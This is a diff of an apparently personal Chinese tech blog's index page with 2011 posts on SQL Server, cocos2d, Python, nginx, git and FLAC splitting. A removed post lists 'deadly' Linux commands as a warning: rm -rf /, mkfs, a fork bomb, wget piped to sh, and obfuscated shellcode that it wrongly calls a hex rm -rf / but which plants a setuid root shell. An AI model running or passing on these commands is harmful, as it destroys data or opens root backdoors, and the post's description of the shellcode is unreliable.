@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。 昨晚下载了SQL SERVER 2008 R2 Express，才64MB，又下载了对应的Management Studio， &hellip;">
+	<meta name="description" content="在python的函数参数中，可以在变量名称前面加一个或者两个星号代表不一样的变量类型： 在stack overflow上看到有人问这两个的区别了，就转载过来答案吧： If the form *identifier is present, it is initialized to a tuple &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,657 +79,6 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/07/16/sql-server-is-so-bad/">
-		
-			SQL SERVER真差劲！</a>
-	</h2>
-	<div class="entry-content">
-		<p>并不想批评微软的产品，因为如果你用得习惯了，什么工具都不再是困难的。以前从没用过SQLSERVER，只是一直在用MySQL，用phpmyadmin管理起来也很方便。</p>
-
-<p>昨晚下载了SQL SERVER 2008 R2 Express，才64MB，又下载了对应的Management Studio，竟然需要270MB！后者安装很不容易，我的硬盘又很小，安装过程中由于失误的操作，复制了一个SQL实例出来，原本就一个叫SQLEXPRESS，现在多了一个MSSQLEXPRESS，本来就很小的空间又一次被减小了，而且还没装上Management！最后磁盘空间实在不够了，我关闭了win7的系统分页文件，一下子出来2.6GB，幸亏内存够大。</p>
-
-<p>安装完毕后，两个实例都在运行，首先关闭一个。然后配置另一个的TCP/IP协议，这样才能正常连接。这里需要说明一下，在【SQL网络配额协议】中的【实例名下】的【TCP/IP】地址，最后一个是IPALL，写上TCP端口：1433，保存。重启实例的服务就能用management连接上了。</p>
-
-<p>在vb中的一个测试代码：（数据库Test，dbo.Member表中有一行数据，tianzhen\tz_pwd）</p>
-
-<p>最可恶的是我在设计表的时候用了nchar类型，长度用了10，如果字段内容不足10就会加空格补全。所以在vb中对于要和数据库中对比的时候必须把从数据库中得到的数据trim一下。</p>
-
-<pre class="prettyprint linenums bush:vb" lang="vb">Imports System.Configuration
-Imports System.Data.SqlClient
-
-Public Class Form1
-
-   Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
-       Dim connStr As String = "Data Source = localhost; Initial Catalog = Test; user id = sa; password = tianzhen;"
-       Dim conn As SqlConnection = New SqlConnection(connStr)
-       Dim cmd As SqlCommand = New SqlCommand()
-       cmd.Connection = conn
-       cmd.CommandText = "SELECT password FROM dbo.Member WHERE username = 'tianzhen'"
-       Dim reader As SqlDataReader
-       conn.Open()
-       reader = cmd.ExecuteReader()
-       Dim login As Boolean = False
-       If reader.Read() Then
-           If TextBox1.Text = Trim(reader("password")) Then
-               MsgBox("login successfully!")
-           Else
-               MsgBox("login fail!!!")
-           End If
-       End If
-       conn.Close()
-   End Sub
-End Class
-</pre>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-16T06:13:00+08:00" pubdate data-updated="true">Jul 16<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/sqlserver/'>sqlserver</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/15/install-cocos2d/">
-		
-			安装cocos2d 1.0</a>
-	</h2>
-	<div class="entry-content">
-		<p>前天cocos2d更新到了1.0版本，这个版本对于开源软件来说是一个里程碑，因为这应该是第一个能够称得上稳定的版本，当然也是新阶段的开始。</p>
-
-<p>安装还是很简单的，我已经安装上了xcode4.0和sdk4.3。</p>
-
-<p>要注意一点的就是安装的时候需要root权限，用sudo即可。</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sh ./install-templates.sh 
-cocos2d-iphone template installer
-
-Error: This script must be run as root in order to copy templates to /Library/Application Support/Developer/Shared/Xcode
-
-Try running it with 'sudo', or with '-u' to install it only you:
-  sudo ./install-templates.sh
-or:
-  ./install-templates.sh -u
-dawncold@tianzhenmatoMacBook-Pro cocos2d-iphone-1.0.0$ sudo sh ./install-templates.sh 
-Password:
-cocos2d-iphone template installer
-
-
-
-Installing Xcode 4 cocos2d iOS template
-----------------------------------------------------
-
-...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/cocos2d/
-...copying cocos2d files
-...copying cocoslive files
-...copying TouchJSON files
-...copying CocosDenshion files
-...copying CocosDenshionExtras files
-...copying FontLabel files
-...copying template files
-done!
-
-
-
-Installing Xcode 4 Chipmunk iOS template
-----------------------------------------------------
-
-...copying Chipmunk files
-done!
-
-
-
-Installing Xcode 4 Box2d iOS template
-----------------------------------------------------
-
-...copying Box2d files
-done!
-
-
-
-Installing Xcode 4 CCNode file templates...
-----------------------------------------------------
-
-...creating destination directory: /Users/dawncold/Library/Developer/Xcode/Templates/File Templates/cocos2d/
-done!
-...creating cocos2d template directory
-
-
-
-
-Installing Xcode 3 cocos2d iOS template
-----------------------------------------------------
-
-...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application/
-...copying template files
-...copying cocos2d files
-...copying cocos2d dependency files
-...copying CocosDenshion files
-...copying cocoslive files
-...copying cocoslive dependency files
-done!
-
-
-
-Installing Xcode 3 cocos2d iOS + box2d template
-----------------------------------------------------
-
-...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Box2d Application/
-...copying template files
-...copying cocos2d files
-...copying cocos2d dependency files
-...copying CocosDenshion files
-...copying cocoslive files
-...copying cocoslive dependency files
-...copying Box2D files
-done!
-
-
-
-Installing Xcode 3 cocos2d iOS + chipmunk template
-----------------------------------------------------
-
-...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Chipmunk Application/
-...copying template files
-...copying cocos2d files
-...copying cocos2d dependency files
-...copying CocosDenshion files
-...copying cocoslive files
-...copying cocoslive dependency files
-...copying Chipmunk files
-done!
-
-
-
-Installing Xcode 3 cocos2d Mac template
-----------------------------------------------------
-
-...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/Project Templates/cocos2d 1.0.0/cocos2d Application - Mac/
-...copying template files
-...copying cocos2d files
-...copying CocosDenshion files
-done!
-...copying file templates
-...creating destination directory: /Library/Application Support/Developer/Shared/Xcode/File Templates/cocos2d 1.0.0/
-
-
-
-Installing Xcode 3 CCNode file templates...
-----------------------------------------------------
-
-done!
-</pre>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-15T20:19:00+08:00" pubdate data-updated="true">Jul 15<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/cocos2d/'>cocos2d</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/14/vb-net-programming-problems/">
-		
-			VB.net考试上机题目汇总</a>
-	</h2>
-	<div class="entry-content">
-		<p>只是更新一下代码，因为在mac中的mono工作得不太好！！</p>
-
-<p>1.求两个数的最大公约数和最小公倍数：</p>
-
-<pre class="prettyprint linenums bush:vb" lang="vb">Module Module1
-
-   Public Function Gcd(ByVal num1 As Integer, ByVal num2 As Integer) As Integer
-       If num2 = 0 Then
-           Return num1
-       Else
-           Return Gcd(num2, num1 Mod num2)
-       End If
-   End Function
-
-   Public Sub Main()
-       Console.WriteLine("Input first num: ")
-       Dim num1 As Integer = Convert.ToInt32(Console.ReadLine())
-       Console.WriteLine("Input second num: ")
-       Dim num2 As Integer = Convert.ToInt32(Console.ReadLine())
-       Console.WriteLine("Gcd is :{0}", Gcd(num1, num2))
-       Console.WriteLine("Lcd is :{0}", (num1 * num2) / Gcd(num1, num2)) '两个数的积除以最大公约数就是最小公倍数
-       Console.ReadLine()
-   End Sub
-
-End Module
-</pre>
-
-
-
-
-
-		
-		<a href="/blog/2011/07/14/vb-net-programming-problems/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-14T18:17:00+08:00" pubdate data-updated="true">Jul 14<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/vb/'>vb</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/12/respect-your-limits/">
-		
-			尊重极限</a>
-	</h2>
-	<div class="entry-content">
-		<p>尊重极限，如同尊重自己。</p>
-
-<p>刚刚从<a href="http://www.psychologies.com.cn/life/investigation/limits">这里</a>看到，尊重极限吧！</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-12T22:07:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/ji-xian/'>极限</a>, <a class='category' href='/blog/categories/jing-zhi-desheng-huo/'>精致de生活</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/12/7-deadly-command-on-linux/">
-		
-			看来的7条致命Linux命令</a>
-	</h2>
-	<div class="entry-content">
-		<pre class="prettyprint linenums bush:bash" lang="bash">1. rm -rf / 此命令将递归并强制删除 / 目录下的所有文件。
-2.
-
-char esp[] __attribute__ ((section(“.text”))) /* e.s.p
-release */
-= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
-“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
-“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
-“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
-“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
-“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
-“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
-“cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;
-
-这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
-3. mkfs.ext3 /dev/sda 这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
-4. : ( ){  : |:&amp; };: 著名的 fork bomp，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
-5. any_command &gt; /dev/sda 使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
-6. wget http://some_untrusted_source -O- | sh 不要从不信任的地方下载东西，这可能会获取恶意代码。
-7. mv /home/yourhomedirectory/* /dev/null 此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。</pre>
-
-
-<p>我在Mac系统下试用了第四条奇怪的明令，没什么效果，看来Mac还稍微安全一点。其他的就不试了……</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-12T18:11:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/an-quan/'>安全</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/10/nginx-location-config/">
-		
-			Nginx下的location配置</a>
-	</h2>
-	<div class="entry-content">
-		<p>原来的location只是处理了“/”的情况，结果访问一个目录，即使此目录下有index.html也不会成功显示，于是改成了这样：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">location ~.*\.(php|php5)?$
-{
-    处理php
-}</pre>
-
-
-<p>这样之后，发现直接访问目录或者域名的时候不能正常显示了，必须跟上index.php这样的才可以。</p>
-
-<p>最终改成这样，解决了问题：</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">location / {
-               root html;
-               index index.html index.php;
-}
-location ~.*\.(php|php5)?$ {
-处理php
-}</pre>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-10T20:15:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/nginx/'>nginx</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/10/git-export-function/">
-		
-			Git的导出功能</a>
-	</h2>
-	<div class="entry-content">
-		<p>用git管理项目的优势大家可能都看了许久了，我也是因为如此才用了git而不是svn、cvs这些。其实我是挺喜欢喜新厌旧的，因为新东西的出现并流行一定是比原来的有所突破，并且大多数人喜欢这种变革，所以为何不喜欢呢？</p>
-
-<p>用git管理项目不可避免要遇到导出功能，在svn和cvs上应该叫export功能，git上的这个功能似乎没找到，要这样做：先打包，再解压到一个地方去。还能接受吧。</p>
-
-<pre class="prettyprint linenums bush:bash" lang="bash">git-archive --prefix=map/ master | tar -x -C ../map_e/</pre>
-
-
-<p>稍微解释一下，prefix指明了用哪个仓库，后面的master应该就是branch的名称了，然后把这些传递给了tar，因为不指明&mdash;format的时候默认用了tar方式打包，所以这里传递给tar解压到上层目录的map_e中，当然实际工作可以解压到生产服务器上去。</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-10T08:13:00+08:00" pubdate data-updated="true">Jul 10<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/export/'>export</a>, <a class='category' href='/blog/categories/git/'>git</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/09/best-content-in-include_path/">
-		
-			最好在include_path中加上根</a>
-	</h2>
-	<div class="entry-content">
-		<p>刚刚用了下typecho博客插件——友情链接来添加一个友情链接，但发现很多php文件找不到了，很奇怪，以前是可以的，看到warning中的信息，有个include_path的相关东西，看看里面提到的路径是不是有需要的文件，结果没有，而在其中路径的下一级目录下有，这就怪了。</p>
-
-<p>Google说最好把include_path写成&#8221;./&ldquo;。是不是这样就是自动便利所有的内容了？我猜是的！当前的include_path中又pear的路径，我就先不删除了，linux系统下用冒号分隔各个路径，在前面加上一个点即可。</p>
-
-<p>重启php，再次访问，恢复正常！</p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-09T16:54:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/php/'>php</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/blog/2011/07/09/seek-and-tell-in-python/">
-		
-			简要写写python的file中的tell和seek</a>
-	</h2>
-	<div class="entry-content">
-		<p>对于一个<a title="file" href="http://www.youth2009.org/tag/file/">file</a>，调用<a title="tell" href="http://www.youth2009.org/tag/tell/">tell</a>能够知道现在的文件位置。<a title="seek" href="http://www.youth2009.org/tag/seek/">seek</a>是改变文件位置。  比如文件中有3行句子，readline后位置就到了第一行的最后，再readline就到了第二行的最后，readline后我调用了tell，看到的结果就是这样的。输出完<a title="tell" href="http://www.youth2009.org/tag/tell/">tell</a>我又使用了<a title="seek" href="http://www.youth2009.org/tag/seek/">seek</a>(0),这样文件位置就回到开头了，下次再调用readline就会输出原来第一行的内容了，这应该是很容易理解的。不明白可以亲自试试。</p>
-
-<pre class="prettyprint linenums bush:python" lang="python">from sys import argv
-
-script, input_file = argv
-
-def print_all(f):
-   print f.read()
-
-def rewind(f):
-   f.seek(0)
-
-def print_a_line(line_count, f):
-   print line_count, f.readline()
-
-current_file = open(input_file)
-
-print "First let's print the while file:\n"
-print_all(current_file)
-
-print "Now let's rewind, kind of like a tape."
-rewind(current_file)
-
-print "Let's print three lines:"
-
-current_line = 1
-print_a_line(current_line, current_file)
-print "current_pos:%d" % current_file.tell()
-rewind(current_file)
-
-current_line += 1
-print_a_line(current_line, current_file)
-print "current_pos:%d" % current_file.tell()
-
-current_line += 1
-print_a_line(current_line, current_file)
-print "current_pos:%d" % current_file.tell()
-</pre>
-
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-09T15:12:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
-	<div class="tags">
-
-
-	<a class='category' href='/blog/categories/file/'>file</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/seek/'>seek</a>, <a class='category' href='/blog/categories/tell/'>tell</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
-
-
-</div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
 		<a href="/blog/2011/07/09/python-one-star-and-two-star/">
 		
 			Python中的*和**</a>
@@ -767,6 +116,540 @@ print "current_pos:%d" % current_file.tell()
 
 
 	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/star/'>star</a>, <a class='category' href='/blog/categories/two-star/'>two star</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/09/python-%25r-and-%25s/">
+		
+			Python中的%r和%s</a>
+	</h2>
+	<div class="entry-content">
+		<p>我并不想完整地比较这两个替换符号的用处，只是发现了一点，可能以后也会这样用。</p>
+
+<p>%r是原始的输入，如果输入了中文，在输出的时候会出现一些类似unicode的代码；其他的会输出带单引号的内容。</p>
+
+<p>%s就是字符串了，输出就是字符串，如果原始输入是中文，那这里也会输出中文。其他的会输出不带单引号的字符串内容。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-09T13:30:00+08:00" pubdate data-updated="true">Jul 9<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/raw/'>raw</a>, <a class='category' href='/blog/categories/string/'>string</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/08/little-fault-in-most-perfect/">
+		
+			美中不足</a>
+	</h2>
+	<div class="entry-content">
+		<p>今天下午考完了OS，有个地方没有复习到，蒙上了，还有个计算题最后检查的时候，自己感觉不对，正在强力修改，不料到点了，就留下了这点美中不足吧。当然其他的题目不能这么简单地认为是美了，只是比这两个稍微有点把握而已，基本能够得到相应的分数吧。</p>
+
+<p>周末两天可以安心复习下面要考的内容了，下星期才是恶战——日语、离散数学！这两门要是都安全通过，再剩下的VB.net和Java Web我就得冲击满分试试啦！哈哈哈……独自狂妄中。</p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-08T21:28:00+08:00" pubdate data-updated="true">Jul 8<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/kao-shi/'>考试</a>, <a class='category' href='/blog/categories/qing-chun/'>青春</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/06/cut-flac-file-on-macos/">
+		
+			Mac下分割flac文件</a>
+	</h2>
+	<div class="entry-content">
+		<p>原来我有很多ape和flac音乐的，在windows时代用foobar软件播放音乐很快乐，但在mac下，就有点儿别扭了，cog可以打开cue文件，并且播放也没问题，就是不能分割，这让人很头疼啊！ 从<a href="http://broadeno.wordpress.com/2009/06/16/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E7%B3%BB%E7%BB%9F%E9%87%8C%E5%88%86%E5%89%B2flac%E9%9F%B3%E4%B9%90%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E8%BD%AC%E6%8D%A2%E4%B8%BAwav/">这里</a>找了些办法，应该可以！ 安装macports这个软件，希望用源代码的方式安装，否则如果用官方的dmg文件安装，到最后一步运行安装脚本的时候你会发现进度条总是停留在最后不动，打开install的日志一看，有很多记录，听其他人说最后在下载一些包的信息文件，就像是一个索引镜像吧，断了网还好。1423s过后，安装完了。 以下是终端的内容：</p>
+
+<p> </p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">dawncold@tianzhenmatomacBook-Pro ~$ sudo port install cuetools
+
+Password:
+---&gt;  Fetching cuetools
+---&gt;  Attempting to fetch cuetools-1.3.1.tar.gz from http://distfiles.macports.org/cuetools
+---&gt;  Verifying checksum(s) for cuetools
+---&gt;  Extracting cuetools
+---&gt;  Configuring cuetools
+---&gt;  Building cuetools
+---&gt;  Staging cuetools into destroot
+---&gt;  Installing cuetools @1.3.1_0
+---&gt;  Activating cuetools @1.3.1_0
+---&gt;  Cleaning cuetools
+dawncold@tianzhenmatoMacBook-Pro ~$ sudo port install shntool
+---&gt;  Computing dependencies for shntool
+---&gt;  Dependencies to be installed: expat gettext libiconv gperf ncurses ncursesw shorten
+---&gt;  Fetching expat
+---&gt;  Attempting to fetch expat-2.0.1.tar.gz from http://nchc.dl.sourceforge.net/project/expat/expat/2.0.1
+---&gt;  Verifying checksum(s) for expat
+---&gt;  Extracting expat
+---&gt;  Configuring expat
+---&gt;  Building expat
+---&gt;  Staging expat into destroot
+---&gt;  Installing expat @2.0.1_1
+---&gt;  Activating expat @2.0.1_1
+---&gt;  Cleaning expat
+---&gt;  Fetching gperf
+---&gt;  Attempting to fetch gperf-3.0.4.tar.gz from ftp://ftp.dti.ad.jp/pub/GNU/gperf
+---&gt;  Verifying checksum(s) for gperf
+---&gt;  Extracting gperf
+---&gt;  Applying patches to gperf
+---&gt;  Configuring gperf
+---&gt;  Building gperf
+---&gt;  Staging gperf into destroot
+---&gt;  Installing gperf @3.0.4_2
+---&gt;  Activating gperf @3.0.4_2
+---&gt;  Cleaning gperf
+---&gt;  Fetching libiconv
+---&gt;  Attempting to fetch libiconv-1.13.1.tar.gz from ftp://ftp.dti.ad.jp/pub/GNU/libiconv
+---&gt;  Verifying checksum(s) for libiconv
+---&gt;  Extracting libiconv
+---&gt;  Applying patches to libiconv
+---&gt;  Configuring libiconv
+---&gt;  Building libiconv
+---&gt;  Staging libiconv into destroot
+---&gt;  Installing libiconv @1.13.1_0
+---&gt;  Activating libiconv @1.13.1_0
+---&gt;  Cleaning libiconv
+---&gt;  Fetching ncursesw
+---&gt;  Verifying checksum(s) for ncursesw
+---&gt;  Extracting ncursesw
+---&gt;  Configuring ncursesw
+---&gt;  Building ncursesw
+---&gt;  Staging ncursesw into destroot
+---&gt;  Installing ncursesw @5.8_0
+---&gt;  Activating ncursesw @5.8_0
+---&gt;  Cleaning ncursesw
+---&gt;  Fetching ncurses
+---&gt;  Attempting to fetch ncurses-5.9.tar.gz from ftp://ftp.dti.ad.jp/pub/GNU/ncurses
+---&gt;  Attempting to fetch ncurses-5.9.tar.gz from http://mirrors.ibiblio.org/pub/mirrors/gnu/ftp/gnu/ncurses
+---&gt;  Verifying checksum(s) for ncurses
+---&gt;  Extracting ncurses
+---&gt;  Applying patches to ncurses
+---&gt;  Configuring ncurses
+---&gt;  Building ncurses
+---&gt;  Staging ncurses into destroot
+---&gt;  Installing ncurses @5.9_0
+---&gt;  Activating ncurses @5.9_0
+---&gt;  Cleaning ncurses
+---&gt;  Fetching gettext
+---&gt;  Attempting to fetch gettext-0.18.1.1.tar.gz from ftp://ftp.dti.ad.jp/pub/GNU/gettext
+---&gt;  Verifying checksum(s) for gettext
+---&gt;  Extracting gettext
+---&gt;  Applying patches to gettext
+---&gt;  Configuring gettext
+---&gt;  Building gettext
+---&gt;  Staging gettext into destroot
+---&gt;  Installing gettext @0.18.1.1_2
+---&gt;  Activating gettext @0.18.1.1_2
+---&gt;  Cleaning gettext
+---&gt;  Fetching shorten
+---&gt;  Attempting to fetch shorten-3.6.1.tar.gz from http://distfiles.macports.org/shorten
+---&gt;  Verifying checksum(s) for shorten
+---&gt;  Extracting shorten
+---&gt;  Configuring shorten
+---&gt;  Building shorten
+---&gt;  Staging shorten into destroot
+---&gt;  Installing shorten @3.6.1_0
+---&gt;  Activating shorten @3.6.1_0
+---&gt;  Cleaning shorten
+---&gt;  Fetching shntool
+---&gt;  Attempting to fetct shntool-3.0.10.tar.gz from http://distfiles.macports.org/shntool
+---&gt;  Verifying checksum(s) for shntool
+---&gt;  Extracting shntool
+---&gt;  Configuring shntool
+---&gt;  Building shntool
+---&gt;  Staging shntool into destroot
+---&gt;  Installing shntool @3.0.10_0
+---&gt;  Activating shntool @3.0.10_0
+---&gt;  Cleaning shntool</pre>
+
+
+<p>这样就安装好了cuetools和shntool这两个软件，其中缺失的依赖软件也被macports自动安装上了，只是在下载的时候没有进度，很可恶，如果又兴趣可以看这里学着改改macports的fetch部分，至少能看看下载了多少，心里也有个数！ 下面进行分割：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">dawncold@tianzhenmatoMacBook-Pro Music$ cuebreakpoints 手嶌葵\(Teshima.Aoi\).-.\[The.Rose～I.Love.Cinemas～\].专辑.\(FLAC\).cue | shnsplit -o flac 手嶌葵\(Teshima.Aoi\).-.\[The.Rose～I.Love.Cinemas～\].专辑.\(FLAC\).flac 
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track01.flac] (3:56.27) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track02.flac] (3:21.71) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track03.flac] (5:36.65) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track04.flac] (2:56.00) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track05.flac] (2:57.12) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track06.flac] (4:31.59) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track07.flac] (4:03.01) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track08.flac] (3:14.16) : 100% OK
+Splitting [手嶌葵(Teshima.Aoi).-.[The.Rose～I.Love.Cinemas～].专辑.(FLAC).flac] (34:12.18) --&gt; [split-track09.flac] (3:34.67) : 100% OK</pre>
+
+
+
+
+<div>文件名有点差劲，也许可以配合cueprint和shnsplit的o参数可以实现完美的转换。</div>
+
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-06T13:59:00+08:00" pubdate data-updated="true">Jul 6<span>th</span>, 2011</time></div>
+	<div class="tags">
+
+
+	<a class='category' href='/blog/categories/macxi-tong-zhong-de-shi-yong-ji-qiao/'>Mac系统中的使用技巧</a>, <a class='category' href='/blog/categories/flac/'>flac</a>, <a class='category' href='/blog/categories/mac/'>mac</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+
+
+</div>
+	
+</div>
+</article>
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2011/07/05/techologist-always-want-to-buy-books/">
+		
+			是不是技术人员都喜欢买书？</a>
+	</h2>
+	<div class="entry-content">
+		<p>自认为我也算是一个追求技术的人了，现在更加喜欢技术的世界了，那里没有一些弹性的东西，不像官场那样可以商量，严格地执行着计算机的语言——0、1。</p>
+
+<p>作为一个技术人员，我发现自己很喜欢买书，当然买的最多的可能就是技术方面的书籍，包括一些被称为计算机编程名著一类的书，当然这些书太多了，在网上混迹时间一长，经不住别人的鼓动、诱惑，终于也走上了收集名著的行列之中，买书之前总是希望自己能够通过这本书学到什么高深的技术，在职场、创业中屹立于不败之地。但买回来之后，并不像我期待的那样，终归还是有些好处的，只是要打些折扣了：）但总归还是比不看书荒废了那段时间好吧。</p>
+
+<p>除了买一些技术性的书籍之外，我还喜欢买一些哲学、心理学、散文等方面的书来看，这和个人的爱好有点关系，但哲学、心理学这类书买得很少，自己只是停留在喜欢的角度，不是非得去研究，所以就不太深入。</p>
+
